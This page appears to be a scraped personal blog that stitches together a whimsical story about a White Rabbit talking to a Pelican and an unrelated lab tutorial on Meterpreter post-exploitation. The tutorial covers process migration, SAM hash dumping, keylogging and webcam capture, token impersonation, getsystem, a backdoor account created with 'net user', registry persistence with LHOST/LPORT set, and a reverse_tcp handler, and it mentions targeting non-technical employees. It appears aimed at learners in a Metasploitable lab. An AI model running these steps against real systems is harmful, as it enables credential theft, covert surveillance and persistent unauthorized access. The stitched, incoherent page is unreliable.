<p>This country used to be an amazing city full of interesting people, things to do and see. However, over the year water level has risen for strange reasons which turned the city down to a little town with with old ancient buildings left in tact and tight street alleys.</p>
<p>The Rabbit decides to head down to his favorite spot to see how the gooses are doing and see the seaside by the dock, cycling there wasn&rsquo;t long of a trip, only 5 minutes to cycle down to get the best place in town. But he stops by a corner shop to buy a delicious, cold and creamy snack perfect for the summer as traditions when heading out.</p>
<p>The docks was filled with boats which were tightly parked like sardines, the wind was swaying the water gently which rocked the boats in a calm manner. Over the water you could see a platform for industrial warehouse to have things dropped off by large boats that have come from far lands, the White Rabbit doesn&rsquo;t travel far but when he does it&rsquo;s to visit his families ice cream business. He took it all in in silence, no thought came over, just a blank slate.</p>
<p>His icy treat was a perfect merge of two strange flavours that you wouldn&rsquo;t expect to go with each other, one side is zesty, sour, fresh yellow part with a complimentary rich, deep flavour with a deep hint of Almond on the more red ish side. This makes it the perfect treat for those days where you could just wear a t-shirt out late at night without getting cold. (≧︿≦)</p>
<p>As he was close to finishing he noticed that a <strong>Pelican</strong> was stood still on a dock beam the entire time, the Rabbit looks over while finishing his treat.</p>
<p>&ldquo;Why do I feel like this, I&rsquo;ve never had an encounter with someone like this before, why today?&rdquo;
the Rabbit says, the Pelican didn&rsquo;t answer or move.</p>
<p>&ldquo;Why do I want her so badly knowing that she has someone already?&rdquo;
Still no answers.</p>
<p>&ldquo;Well I just wanted to say thank you for letting me dream for just one day, I knew the moment wouldn&rsquo;t last so I cherished it, every minutes and I&rsquo;m glad you gave me this gift for the efforts I put in this world, You are Real.&rdquo;
The Pelican looks over.</p>
<p>&ldquo;You have done well in your hard journey up until know, you have improved yourself far enough through these grusome years of self-improvement and I believe you are worthy for a selection of a complimentory, enternal partner&rdquo;
The Pelican responded after staying silence.</p>
<p>In awe the Rabbit stood there amazed at what he has just witnessed, &ldquo;Did you just speak to me?&rdquo; the Rabbit responded.</p>
<p>The Pelican flies off into the river side into the horizon, what great response that was from it, but it did lack clarity, I&rsquo;m sure this won&rsquo;t effect the story.</p>
<video controls muted>
  <source src="20240615_205006_online-video-cutter.com.mp4" type="video/mp4">
  Your browser does not support the video tag.
</video>
<p>Rabbit decides to hop back on bike and then head over to the dock crossing bridge edge where he can see a great view of the ocean and distant silhouette.</p>
<p>On the way he saw the goose house that sits between a building and a still part of the dock river which allows them to freely swim in and out of the ocean and river, there are small babies inside along with the mother and no sight of the father, probably out hunting for the kids. There was one of the baby geese that was out swimming by itself. It was a courageous small geese and wanted to explore around the house which it did, it got stuck and screamed out but the mother wasn&rsquo;t going to help, she was too busy keep all the others together. So Rabbit watched it struggle for a little while thinking to go over and help but he just sat there, eventually it got back to its mother but it really makes you think that you are truly alone in this world that even your own mother might not help so be the toughest person you can be in this world. (ﾉ◕ヮ◕)ﾉ*:・ﾟ✧</p>
<p>&ldquo;What a great view&rdquo; the Rabbit thought as he was siting down on that windy night, it was a strong wind coming towards East which had the Rabbit huddle for warmth but luckily he wears a white top which keeps him very warm a cosy and would also another person if needed it was that big. After a while of sitting he decides to lay there for a bit a look at the distant stars that are starting to appear, he felt like just laying down there in the cold and getting cozy under the moon light.</p>
<p>He was shaking from the cold breeze coming from the ocean which attracted the attention of seagulls which decided to cycle above his head as if they were vultures ready to eat him when he stops moving.</p>
<p>&ldquo;Thank you for this short dream, I am forever grateful for this dream and opertunity to experience history being made as I write this. I just wanted to say that the beings beyond me are the ones to thanks, every one and everything and the Buddha.&rdquo;</p>
<p>Bro then returned home and fell asleep as if nothing happened, bro chilled out but couldn&rsquo;t sleep for some reason which was something that happens all the time so he reads &ldquo;Kafka on the Shore&rdquo; by Haruki Murakami which is a fantastic aurthor and I would recommend &ldquo;Norwegian Wood&rdquo; by Haruki Murakami as this has more sexy scenes and better story telling.
<video controls muted>
<source src="20240615_205943_online-video-cutter.com.mp4" type="video/mp4">
Your browser does not support the video tag.
</video></p>


<h2 class="relative group">1. Post-exploitation using Meterpreter 
    <div id="1-post-exploitation-using-meterpreter" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
            style="text-decoration-line: none !important;" href="#1-post-exploitation-using-meterpreter" aria-label="Anchor">#</a>
    </span>        
    
</h2>
<ol>
<li>Using the reverse-shell gained from <a href="../part-6-all-on-networking-penetration-baby/#42-smb-eternalblue-vulnerability"  >
    Part 6 #42 smb eternalblue vulnerability</a></li>
</ol>
<p>




  
  
    
  
  
    <figure>
      
      <img
        class="my-0 rounded-md"
        loading="lazy"
        srcset="
        /posts/part-7-advanced-network-penetration-testing-post-exploitation/Meterpreter-UID_hud43a94291f033c3f1d97b5a26a8b3c90_25721_330x0_resize_box_3.png 330w,
        /posts/part-7-advanced-network-penetration-testing-post-exploitation/Meterpreter-UID_hud43a94291f033c3f1d97b5a26a8b3c90_25721_660x0_resize_box_3.png 660w,
        /posts/part-7-advanced-network-penetration-testing-post-exploitation/Meterpreter-UID_hud43a94291f033c3f1d97b5a26a8b3c90_25721_1024x0_resize_box_3.png 1024w,
        /posts/part-7-advanced-network-penetration-testing-post-exploitation/Meterpreter-UID_hud43a94291f033c3f1d97b5a26a8b3c90_25721_1320x0_resize_box_3.png 2x"
        src="/posts/part-7-advanced-network-penetration-testing-post-exploitation/Meterpreter-UID_hud43a94291f033c3f1d97b5a26a8b3c90_25721_660x0_resize_box_3.png"
        alt="Meterpreter-UID"
      />
      
      
    </figure>
  

</p>
<ol start="2">
<li>Meterpreter runs on the targets memory which doesn&rsquo;t write any data, however it will show as a running process. We can migrate the process into a less suspicious process with <code>run post/windows/manage/migrate</code></li>
</ol>
<p>




  
  
    
  
  
    <figure>
      
      <img
        class="my-0 rounded-md"
        loading="lazy"
        srcset="
        /posts/part-7-advanced-network-penetration-testing-post-exploitation/Meterpreter-migrate_hu83ca01ad2312be1767ef40196f2882c5_22848_330x0_resize_box_3.png 330w,
        /posts/part-7-advanced-network-penetration-testing-post-exploitation/Meterpreter-migrate_hu83ca01ad2312be1767ef40196f2882c5_22848_660x0_resize_box_3.png 660w,
        /posts/part-7-advanced-network-penetration-testing-post-exploitation/Meterpreter-migrate_hu83ca01ad2312be1767ef40196f2882c5_22848_1024x0_resize_box_3.png 1024w,
        /posts/part-7-advanced-network-penetration-testing-post-exploitation/Meterpreter-migrate_hu83ca01ad2312be1767ef40196f2882c5_22848_1320x0_resize_box_3.png 2x"
        src="/posts/part-7-advanced-network-penetration-testing-post-exploitation/Meterpreter-migrate_hu83ca01ad2312be1767ef40196f2882c5_22848_660x0_resize_box_3.png"
        alt="Meterpreter-migrate"
      />
      
      
    </figure>
  

</p>
<ol start="3">
<li>Windows will have hashes of users login password stored on the Security Account Manager (SAM) which is usually located at <code>C:\Windows\System32\config</code>. This can be retrieved using <code>hashdump</code></li>
</ol>
<p>




  
  
    
  
  
    <figure>
      
      <img
        class="my-0 rounded-md"
        loading="lazy"
        srcset="
        /posts/part-7-advanced-network-penetration-testing-post-exploitation/Meterpreter-Hashdump_hua086c6b0f07840a9b66835873a6a7138_29191_330x0_resize_box_3.png 330w,
        /posts/part-7-advanced-network-penetration-testing-post-exploitation/Meterpreter-Hashdump_hua086c6b0f07840a9b66835873a6a7138_29191_660x0_resize_box_3.png 660w,
        /posts/part-7-advanced-network-penetration-testing-post-exploitation/Meterpreter-Hashdump_hua086c6b0f07840a9b66835873a6a7138_29191_1024x0_resize_box_3.png 1024w,
        /posts/part-7-advanced-network-penetration-testing-post-exploitation/Meterpreter-Hashdump_hua086c6b0f07840a9b66835873a6a7138_29191_1320x0_resize_box_3.png 2x"
        src="/posts/part-7-advanced-network-penetration-testing-post-exploitation/Meterpreter-Hashdump_hua086c6b0f07840a9b66835873a6a7138_29191_660x0_resize_box_3.png"
        alt="Meterpreter-Hashdump"
      />
      
      
    </figure>
  

</p>


<h3 class="relative group">1.1 Useful Meterpreter Commands 
    <div id="11-useful-meterpreter-commands" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
            style="text-decoration-line: none !important;" href="#11-useful-meterpreter-commands" aria-label="Anchor">#</a>
    </span>        
    
</h3>
<p><strong>keyscan_start</strong>: Meterpreter begins capturing the keystrokes entered by a user on the compromised host.
<strong>keyscan_stop</strong>: Stop capturing the keystrokes entered by a user on the compromised system.
<strong>keyscan_dump</strong>: Exports the captured keystrokes into a file.
<strong>screenshot</strong>: Meterpreter will capture a screenshot of the desktop on the compromised host.
<strong>screenshare</strong>: Begins a real-time stream showing the live actions performed by a user on the compromised host.
<strong>record_mic</strong>: Meterpreter activates the microphone on the compromised host and begins recording.
<strong>webcam_list</strong>: Displays a list of webcams available on the compromised host.
<strong>webcam_snap</strong>: Activates the webcam on the compromised host and takes a picture.
<strong>webcam_stream</strong>: Begins a live stream from the webcam on the compromised system.
<strong>search</strong>: Using the search –f <code>&lt;filename&gt;</code> command quickly searches on the compromised system for the file.
<strong>pwd</strong>: Displays the present working directory when using a Meterpreter shell on a compromised system.
<strong>cd</strong>: This command allows you to change the working directory while using the Meterpreter session on a compromised host.</p>


<h3 class="relative group">1.2 Uploading and downloading files 
    <div id="12-uploading-and-downloading-files" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
            style="text-decoration-line: none !important;" href="#12-uploading-and-downloading-files" aria-label="Anchor">#</a>
    </span>        
    
</h3>
<ol>
<li>Uploading <code>vncviewer.exe</code> from Part 5 with <code>meterpreter &gt; upload /usr/share/windows-binaries/vncviewer.exe c:\\</code></li>
</ol>
<p>




  
  
    
  
  
    <figure>
      
      <img
        class="my-0 rounded-md"
        loading="lazy"
        srcset="
        /posts/part-7-advanced-network-penetration-testing-post-exploitation/Meterpreter-upload_hu1db65c57f9fbcadd44f06bc71e06b8b6_13269_330x0_resize_box_3.png 330w,
        /posts/part-7-advanced-network-penetration-testing-post-exploitation/Meterpreter-upload_hu1db65c57f9fbcadd44f06bc71e06b8b6_13269_660x0_resize_box_3.png 660w,
        /posts/part-7-advanced-network-penetration-testing-post-exploitation/Meterpreter-upload_hu1db65c57f9fbcadd44f06bc71e06b8b6_13269_1024x0_resize_box_3.png 1024w,
        /posts/part-7-advanced-network-penetration-testing-post-exploitation/Meterpreter-upload_hu1db65c57f9fbcadd44f06bc71e06b8b6_13269_1320x0_resize_box_3.png 2x"
        src="/posts/part-7-advanced-network-penetration-testing-post-exploitation/Meterpreter-upload_hu1db65c57f9fbcadd44f06bc71e06b8b6_13269_660x0_resize_box_3.png"
        alt="Meterpreter-upload"
      />
      
      
    </figure>
  

</p>
<p>




  
  
    
  
  
    <figure>
      
      <img
        class="my-0 rounded-md"
        loading="lazy"
        srcset="
        /posts/part-7-advanced-network-penetration-testing-post-exploitation/vncviewer-location_hu729b46a22d4550d4437e4b721acd436a_74598_330x0_resize_box_3.png 330w,
        /posts/part-7-advanced-network-penetration-testing-post-exploitation/vncviewer-location_hu729b46a22d4550d4437e4b721acd436a_74598_660x0_resize_box_3.png 660w,
        /posts/part-7-advanced-network-penetration-testing-post-exploitation/vncviewer-location_hu729b46a22d4550d4437e4b721acd436a_74598_1024x0_resize_box_3.png 1024w,
        /posts/part-7-advanced-network-penetration-testing-post-exploitation/vncviewer-location_hu729b46a22d4550d4437e4b721acd436a_74598_1320x0_resize_box_3.png 2x"
        src="/posts/part-7-advanced-network-penetration-testing-post-exploitation/vncviewer-location_hu729b46a22d4550d4437e4b721acd436a_74598_660x0_resize_box_3.png"
        alt="vncviewer-location"
      />
      
      
    </figure>
  

</p>
<ol start="2">
<li>Download files with <code>download c:\\java0.log /home/kali/Desktop</code></li>
</ol>
<p>




  
  
    
  
  
    <figure>
      
      <img
        class="my-0 rounded-md"
        loading="lazy"
        srcset="
        /posts/part-7-advanced-network-penetration-testing-post-exploitation/Meterpreter-Download-file_hua3a9220fb6e0cb292a11dea066da6d4a_22545_330x0_resize_box_3.png 330w,
        /posts/part-7-advanced-network-penetration-testing-post-exploitation/Meterpreter-Download-file_hua3a9220fb6e0cb292a11dea066da6d4a_22545_660x0_resize_box_3.png 660w,
        /posts/part-7-advanced-network-penetration-testing-post-exploitation/Meterpreter-Download-file_hua3a9220fb6e0cb292a11dea066da6d4a_22545_1024x0_resize_box_3.png 1024w,
        /posts/part-7-advanced-network-penetration-testing-post-exploitation/Meterpreter-Download-file_hua3a9220fb6e0cb292a11dea066da6d4a_22545_1320x0_resize_box_3.png 2x"
        src="/posts/part-7-advanced-network-penetration-testing-post-exploitation/Meterpreter-Download-file_hua3a9220fb6e0cb292a11dea066da6d4a_22545_660x0_resize_box_3.png"
        alt="Meterpreter-Download-file"
      />
      
      
    </figure>
  

</p>


<h2 class="relative group">2. Privilege Escalation In Meterpreter 
    <div id="2-privilege-escalation-in-meterpreter" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
            style="text-decoration-line: none !important;" href="#2-privilege-escalation-in-meterpreter" aria-label="Anchor">#</a>
    </span>        
    
</h2>
<p>When targeting real organisations I will be most likely targeting employees that aren&rsquo;t the most tech-savy to gain either a reverse or bind shell, this is great to get access inside a network but I won&rsquo;t have the level of access to perform administrative commands which is game over for a target.</p>
<ol>
<li>To increase my privilege on the win2k8 vm machine I will use the <code>priv</code> extension provided within Meterpreter</li>
</ol>


<h3 class="relative group">2.1 Token Stealing and Impersonation 
    <div id="21-token-stealing-and-impersonation" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
            style="text-decoration-line: none !important;" href="#21-token-stealing-and-impersonation" aria-label="Anchor">#</a>
    </span>        
    
</h3>
<p>When an admin remotely accesses a host this creates a token like a footprint of their past login activity, if found on a compromised host within a Meterpreter shell it can be used to escalate our privilege</p>
<ol>
<li>
<p>With a MSF eternalblue meterpreter shell, run <code>use incognito</code> to get extra commands followed by <code>list_tokens -u</code>





  
  
    
  
  
    <figure>
      
      <img
        class="my-0 rounded-md"
        loading="lazy"
        srcset="
        /posts/part-7-advanced-network-penetration-testing-post-exploitation/Token-Stealing-Meterpreter_huad2249218468355c40cd889f9e5e5ab1_24402_330x0_resize_box_3.png 330w,
        /posts/part-7-advanced-network-penetration-testing-post-exploitation/Token-Stealing-Meterpreter_huad2249218468355c40cd889f9e5e5ab1_24402_660x0_resize_box_3.png 660w,
        /posts/part-7-advanced-network-penetration-testing-post-exploitation/Token-Stealing-Meterpreter_huad2249218468355c40cd889f9e5e5ab1_24402_1024x0_resize_box_3.png 1024w,
        /posts/part-7-advanced-network-penetration-testing-post-exploitation/Token-Stealing-Meterpreter_huad2249218468355c40cd889f9e5e5ab1_24402_1320x0_resize_box_3.png 2x"
        src="/posts/part-7-advanced-network-penetration-testing-post-exploitation/Token-Stealing-Meterpreter_huad2249218468355c40cd889f9e5e5ab1_24402_660x0_resize_box_3.png"
        alt="Token-Stealing-Meterpreter"
      />
      
      
    </figure>
  

</p>
</li>
<li>
<p>I then logged into the win2k8 lab administrator account and impersonated the token with <code>impersonate_token &quot;VAGRANT-2008R2\Administrator&quot;</code></p>
</li>
</ol>
<p>




  
  
    
  
  
    <figure>
      
      <img
        class="my-0 rounded-md"
        loading="lazy"
        srcset="
        /posts/part-7-advanced-network-penetration-testing-post-exploitation/Get-Stolen-Token_hud10bcd5ffbcf9196e20f2cd063cb78cf_38980_330x0_resize_box_3.png 330w,
        /posts/part-7-advanced-network-penetration-testing-post-exploitation/Get-Stolen-Token_hud10bcd5ffbcf9196e20f2cd063cb78cf_38980_660x0_resize_box_3.png 660w,
        /posts/part-7-advanced-network-penetration-testing-post-exploitation/Get-Stolen-Token_hud10bcd5ffbcf9196e20f2cd063cb78cf_38980_1024x0_resize_box_3.png 1024w,
        /posts/part-7-advanced-network-penetration-testing-post-exploitation/Get-Stolen-Token_hud10bcd5ffbcf9196e20f2cd063cb78cf_38980_1320x0_resize_box_3.png 2x"
        src="/posts/part-7-advanced-network-penetration-testing-post-exploitation/Get-Stolen-Token_hud10bcd5ffbcf9196e20f2cd063cb78cf_38980_660x0_resize_box_3.png"
        alt="Get-Stolen-Token"
      />
      
      
    </figure>
  

</p>
<ol start="3">
<li>Use <code>getsystem</code> command to migrate from administrator to system authority which is the highest level of authority.</li>
</ol>


<h2 class="relative group">3. Implementing Persistence 
    <div id="3-implementing-persistence" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
            style="text-decoration-line: none !important;" href="#3-implementing-persistence" aria-label="Anchor">#</a>
    </span>        
    
</h2>
<p>A meterpreter shell connection will be loading into ram meaning that whenever the target client turn&rsquo;s off power to their machine we loose a connection which means we will have to go through the process of opening another shell. I could use a few techniques with Meterpreter to create persistence, meaning that I could connect to the host whenever it&rsquo;s online.</p>


<h3 class="relative group">3.1 Creating Persistence through Account Creation Backdoor 
    <div id="31-creating-persistence-through-account-creation-backdoor" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
            style="text-decoration-line: none !important;" href="#31-creating-persistence-through-account-creation-backdoor" aria-label="Anchor">#</a>
    </span>        
    
</h3>
<ol>
<li>With a Meterpreter connection to the Win2k8 Lab machine, execute following command to enable RDP port: <code>run post/windows/manage/enable_rdp</code></li>
<li>Create a <code>shell</code> and run <code>net user pentester password1 /add</code> to create a user &lsquo;pentester&rsquo; with &lsquo;password1&rsquo; as the login pass</li>
</ol>
<p>




  
  
    
  
  
    <figure>
      
      <img
        class="my-0 rounded-md"
        loading="lazy"
        srcset="
        /posts/part-7-advanced-network-penetration-testing-post-exploitation/Creating-Persistence-backdoor_huaf7611c6d27940fa585240000c8a5b1e_52255_330x0_resize_box_3.png 330w,
        /posts/part-7-advanced-network-penetration-testing-post-exploitation/Creating-Persistence-backdoor_huaf7611c6d27940fa585240000c8a5b1e_52255_660x0_resize_box_3.png 660w,
        /posts/part-7-advanced-network-penetration-testing-post-exploitation/Creating-Persistence-backdoor_huaf7611c6d27940fa585240000c8a5b1e_52255_1024x0_resize_box_3.png 1024w,
        /posts/part-7-advanced-network-penetration-testing-post-exploitation/Creating-Persistence-backdoor_huaf7611c6d27940fa585240000c8a5b1e_52255_1320x0_resize_box_3.png 2x"
        src="/posts/part-7-advanced-network-penetration-testing-post-exploitation/Creating-Persistence-backdoor_huaf7611c6d27940fa585240000c8a5b1e_52255_660x0_resize_box_3.png"
        alt="Creating-Persistence-backdoor"
      />
      
      
    </figure>
  

</p>
<p>




  
  
    
  
  
    <figure>
      
      <img
        class="my-0 rounded-md"
        loading="lazy"
        srcset="
        /posts/part-7-advanced-network-penetration-testing-post-exploitation/Windows-Server-2008_hu3db48aae6e52372402e1adca366e69db_177321_330x0_resize_box_3.png 330w,
        /posts/part-7-advanced-network-penetration-testing-post-exploitation/Windows-Server-2008_hu3db48aae6e52372402e1adca366e69db_177321_660x0_resize_box_3.png 660w,
        /posts/part-7-advanced-network-penetration-testing-post-exploitation/Windows-Server-2008_hu3db48aae6e52372402e1adca366e69db_177321_1024x0_resize_box_3.png 1024w,
        /posts/part-7-advanced-network-penetration-testing-post-exploitation/Windows-Server-2008_hu3db48aae6e52372402e1adca366e69db_177321_1320x0_resize_box_3.png 2x"
        src="/posts/part-7-advanced-network-penetration-testing-post-exploitation/Windows-Server-2008_hu3db48aae6e52372402e1adca366e69db_177321_660x0_resize_box_3.png"
        alt="Windows-Server-2008"
      />
      
      
    </figure>
  

</p>
<ol start="3">
<li>When trying to connect using the Rdesktop tool to log into the account created I come across an error message for configuring allow log on for the user !! Try to find a bypass for RDP new member Allow log on through Terminal Services, check if the payload has been created !</li>
</ol>
<p>




  
  
    
  
  
    <figure>
      
      <img
        class="my-0 rounded-md"
        loading="lazy"
        srcset="
        /posts/part-7-advanced-network-penetration-testing-post-exploitation/Remote-log-error_hue5cade3d01fbf9e96abd943d77f11f19_13411_330x0_resize_box_3.png 330w,
        /posts/part-7-advanced-network-penetration-testing-post-exploitation/Remote-log-error_hue5cade3d01fbf9e96abd943d77f11f19_13411_660x0_resize_box_3.png 660w,
        /posts/part-7-advanced-network-penetration-testing-post-exploitation/Remote-log-error_hue5cade3d01fbf9e96abd943d77f11f19_13411_1024x0_resize_box_3.png 1024w,
        /posts/part-7-advanced-network-penetration-testing-post-exploitation/Remote-log-error_hue5cade3d01fbf9e96abd943d77f11f19_13411_1320x0_resize_box_3.png 2x"
        src="/posts/part-7-advanced-network-penetration-testing-post-exploitation/Remote-log-error_hue5cade3d01fbf9e96abd943d77f11f19_13411_660x0_resize_box_3.png"
        alt="Remote-log-error"
      />
      
      
    </figure>
  

</p>

  
  
  
  



<div
  
    class="flex px-4 py-3 rounded-md"
    style="background-color: #fcf0e8"
  >

  <span
    
      class="ltr:pr-3 rtl:pl-3 flex items-center"
      style="color: #eb974c"
    >

    

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M506.3 417l-213.3-364c-16.33-28-57.54-28-73.98 0l-213.2 364C-10.59 444.9 9.849 480 42.74 480h426.6C502.1 480 522.6 445 506.3 417zM232 168c0-13.25 10.75-24 24-24S280 154.8 280 168v128c0 13.25-10.75 24-23.1 24S232 309.3 232 296V168zM256 416c-17.36 0-31.44-14.08-31.44-31.44c0-17.36 14.07-31.44 31.44-31.44s31.44 14.08 31.44 31.44C287.4 401.9 273.4 416 256 416z"/></svg>

  </span>


  </span>

  <span
    
      style="color: #eb974c"
    >If persistence isn&rsquo;t necessary for a penetration test, simply don&rsquo;t do it.</span>
</div>



<h3 class="relative group">3.2 Registry Persistence Creation 
    <div id="32-registry-persistence-creation" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
            style="text-decoration-line: none !important;" href="#32-registry-persistence-creation" aria-label="Anchor">#</a>
    </span>        
    
</h3>
<p>MSF contains two main modules which are designed for Window persistence creation:</p>
<ul>
<li><code>exploit/windows/local/persistence</code></li>
<li><code>exploit/windows/local/registry_persistence</code>
Both will modify the registry value located within <code>HKLM\Software\Microsoft\Windows\CurrentVersion\Run</code> and insert a VBS script in <code>C:\WINDOWS\TEMP\</code> which executes the script whenever the user boots up the machine.</li>
</ul>
<ol>
<li>Execute the following commands on MSF</li>
</ol>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">meterpreter &gt; background
</span></span><span class="line"><span class="cl">msf6 &gt; use exploit/windows/local/persistence
</span></span><span class="line"><span class="cl">msf6 <span class="o">(</span>windows/local/persistence<span class="o">)</span> &gt; <span class="nb">set</span> SESSION <span class="m">1</span>
</span></span><span class="line"><span class="cl">msf6 <span class="o">(</span>windows/local/persistence<span class="o">)</span> &gt; <span class="nb">set</span> STARTUP SYSTEM
</span></span><span class="line"><span class="cl">msf6 <span class="o">(</span>windows/local/persistence<span class="o">)</span> &gt; <span class="nb">set</span> LHOST 172.30.1.21
</span></span><span class="line"><span class="cl">msf6 <span class="o">(</span>windows/local/persistence<span class="o">)</span> &gt; <span class="nb">set</span> LPORT <span class="m">87</span>
</span></span><span class="line"><span class="cl">msf6 <span class="o">(</span>windows/local/persistence<span class="o">)</span> &gt; exploit
</span></span></code></pre></div><p>




  
  
    
  
  
    <figure>
      
      <img
        class="my-0 rounded-md"
        loading="lazy"
        srcset="
        /posts/part-7-advanced-network-penetration-testing-post-exploitation/Meterpreter-Windows-Persistence_hu004b4fb825e3165a639741a79c94bc58_64939_330x0_resize_box_3.png 330w,
        /posts/part-7-advanced-network-penetration-testing-post-exploitation/Meterpreter-Windows-Persistence_hu004b4fb825e3165a639741a79c94bc58_64939_660x0_resize_box_3.png 660w,
        /posts/part-7-advanced-network-penetration-testing-post-exploitation/Meterpreter-Windows-Persistence_hu004b4fb825e3165a639741a79c94bc58_64939_1024x0_resize_box_3.png 1024w,
        /posts/part-7-advanced-network-penetration-testing-post-exploitation/Meterpreter-Windows-Persistence_hu004b4fb825e3165a639741a79c94bc58_64939_1320x0_resize_box_3.png 2x"
        src="/posts/part-7-advanced-network-penetration-testing-post-exploitation/Meterpreter-Windows-Persistence_hu004b4fb825e3165a639741a79c94bc58_64939_660x0_resize_box_3.png"
        alt="Meterpreter-Windows-Persistence"
      />
      
      
    </figure>
  

</p>
<ol start="2">
<li>After creating a persistence payload on the target, connect to it with the following commands</li>
</ol>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msf6 &gt; use exploit/multi/handler
</span></span><span class="line"><span class="cl">msf6 exploit<span class="o">(</span>multi/handler<span class="o">)</span> &gt; <span class="nb">set</span> payload windows/meterpreter/reverse_tcp
</span></span><span class="line"><span class="cl">msf6 exploit<span class="o">(</span>multi/handler<span class="o">)</span> &gt; <span class="nb">set</span> AutoRunScript post/windows/manage/migrate
</span></span><span class="line"><span class="cl">msf6 exploit<span class="o">(</span>multi/handler<span class="o">)</span> &gt; <span class="nb">set</span> LPORT <span class="m">87</span>
</span></span><span class="line"><span class="cl">msf6 exploit<span class="o">(</span>multi/handler<span class="o">)</span> &gt; exploit
</span></span></code></pre></div>

<h3 class="relative group">3.3 Lateral Movement and Pivoting 
    <div id="33-lateral-movement-and-pivoting" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
            style="text-decoration-line: none !important;" href="#33-lateral-movement-and-pivoting" aria-label="Anchor">#</a>
    </span>        
    
</h3>
<ol>
<li>Turn on Metsploitable 3 Win2k8 and Metasploitable 3 Linux</li>
<li>Obtain a Meterpreter shell and use the <code>arp</code> command</li>
</ol>
<p>




  
  
    
  
  
    <figure>
      
      <img
        class="my-0 rounded-md"
        loading="lazy"
        srcset="
        /posts/part-7-advanced-network-penetration-testing-post-exploitation/Meterpreter-arp-pivoting_hu211769c6a24aea377e7f1678a0d4e739_156939_330x0_resize_box_3.png 330w,
        /posts/part-7-advanced-network-penetration-testing-post-exploitation/Meterpreter-arp-pivoting_hu211769c6a24aea377e7f1678a0d4e739_156939_660x0_resize_box_3.png 660w,
        /posts/part-7-advanced-network-penetration-testing-post-exploitation/Meterpreter-arp-pivoting_hu211769c6a24aea377e7f1678a0d4e739_156939_1024x0_resize_box_3.png 1024w,
        /posts/part-7-advanced-network-penetration-testing-post-exploitation/Meterpreter-arp-pivoting_hu211769c6a24aea377e7f1678a0d4e739_156939_1320x0_resize_box_3.png 2x"
        src="/posts/part-7-advanced-network-penetration-testing-post-exploitation/Meterpreter-arp-pivoting_hu211769c6a24aea377e7f1678a0d4e739_156939_660x0_resize_box_3.png"
        alt="Meterpreter-arp-pivoting"
      />
      
      
    </figure>
  

</p>
<ol start="3">
<li>List network interfaces and their MAC address with <code>ipconfig</code> which allows us to see the hidden network Netmask in the following screenshot:</li>
</ol>
<p>




  
  
    
  
  
    <figure>
      
      <img
        class="my-0 rounded-md"
        loading="lazy"
        srcset="
        /posts/part-7-advanced-network-penetration-testing-post-exploitation/Interface-MAC-Ipconfig_hu6aea06d454fca490c1cdd88ec28b3e6f_45919_330x0_resize_box_3.png 330w,
        /posts/part-7-advanced-network-penetration-testing-post-exploitation/Interface-MAC-Ipconfig_hu6aea06d454fca490c1cdd88ec28b3e6f_45919_660x0_resize_box_3.png 660w,
        /posts/part-7-advanced-network-penetration-testing-post-exploitation/Interface-MAC-Ipconfig_hu6aea06d454fca490c1cdd88ec28b3e6f_45919_1024x0_resize_box_3.png 1024w,
        /posts/part-7-advanced-network-penetration-testing-post-exploitation/Interface-MAC-Ipconfig_hu6aea06d454fca490c1cdd88ec28b3e6f_45919_1320x0_resize_box_3.png 2x"
        src="/posts/part-7-advanced-network-penetration-testing-post-exploitation/Interface-MAC-Ipconfig_hu6aea06d454fca490c1cdd88ec28b3e6f_45919_660x0_resize_box_3.png"
        alt="Interface-MAC-Ipconfig"
      />
      
      
    </figure>
  

</p>
<ol start="4">
<li>The <code>route</code> command will confirm any gateways accessible from the Meterpreter connection</li>
</ol>
<p>




  
  
    
  
  
    <figure>
      
      <img
        class="my-0 rounded-md"
        loading="lazy"
        srcset="
        /posts/part-7-advanced-network-penetration-testing-post-exploitation/Subnet-Route-trace_huc987dce4cb8f9215dd4d89da9edd5274_58302_330x0_resize_box_3.png 330w,
        /posts/part-7-advanced-network-penetration-testing-post-exploitation/Subnet-Route-trace_huc987dce4cb8f9215dd4d89da9edd5274_58302_660x0_resize_box_3.png 660w,
        /posts/part-7-advanced-network-penetration-testing-post-exploitation/Subnet-Route-trace_huc987dce4cb8f9215dd4d89da9edd5274_58302_1024x0_resize_box_3.png 1024w,
